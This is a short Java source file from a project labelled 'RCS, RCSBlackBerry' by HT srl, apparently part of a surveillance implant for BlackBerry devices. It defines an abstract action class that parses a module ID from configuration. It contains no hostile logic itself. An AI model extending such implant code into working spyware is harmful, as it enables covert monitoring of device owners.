//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2012
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.action;

import blackberry.Messages;
import blackberry.config.ConfAction;
import blackberry.config.ConfigurationException;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

abstract class ModuleAction extends SubAction {
    //#ifdef DEBUG
    private static Debug debug = new Debug("ModAction", DebugLevel.VERBOSE); //$NON-NLS-1$
    //#endif
    protected String moduleId;

    /**
     * Instantiates a new stop agent action.
     * 
     * @param jsubaction
     *            the conf params
     */
    public ModuleAction(final ConfAction jsubaction) {
        super(jsubaction);
    }

    protected boolean parse(ConfAction params) {

        try {
            this.moduleId = params.getString(Messages.getString("c.1")); //$NON-NLS-1$
        } catch (ConfigurationException e) {
            //#ifdef DEBUG
            debug.error(e);
            debug.error("parse"); //$NON-NLS-1$
            //#endif
            return false;
        }

        return true;
    }

}
